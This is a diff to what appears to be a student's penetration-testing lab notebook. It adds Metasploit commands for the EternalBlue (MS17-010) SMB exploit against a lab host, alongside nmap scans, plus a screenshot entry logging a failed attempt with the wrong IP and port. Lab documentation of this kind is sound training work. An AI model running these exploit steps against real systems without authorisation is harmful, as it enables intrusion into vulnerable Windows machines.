@@ -136,7 +136,15 @@ enum4linux -a "$RHOST"
 
 ```bash
 nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
-# msfconsole: use auxiliary/scanner/smb/smb_ms17_010 — set RHOSTS 10.20.160.101 — run
+```
+
+```text
+# EternalBlue targets SMB — RPORT must be 445, RHOSTS must be 10.20.160.101 (not 10.20.150.x)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.20.160.101
+set RPORT 445
+set LHOST <KALI_LAB_IP>
+check
 ```
 
 **HTTP on 80/443 (parallel lane):**
@@ -163,6 +171,7 @@ nmap -Pn -p3389,21 -sV -sC "$RHOST"
 | **101-003** | [`101-003_enum4linux_access_denied_tm6_afrocha.png`](../Screenshots/101-003_enum4linux_access_denied_tm6_afrocha.png) | SID/OS/users/shares → **`ACCESS_DENIED`** |
 | **101-004** | [`101-004_enum4linux_polenum_null_fail_tm6_afrocha.png`](../Screenshots/101-004_enum4linux_polenum_null_fail_tm6_afrocha.png) | Password policy / **NULL** session attach fail |
 | **101-005** | [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](../Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png) | Groups / RID / printers → **denied** |
+| **101-006** | [`101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png`](../Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png) | MSF EternalBlue — **wrong IP octet** + **`RPORT 80`** (use **`.160.101`** + **`445`**) — see [`unfruitful_attempts`](unfruitful_attempts/README.md) |
 
 ---
 
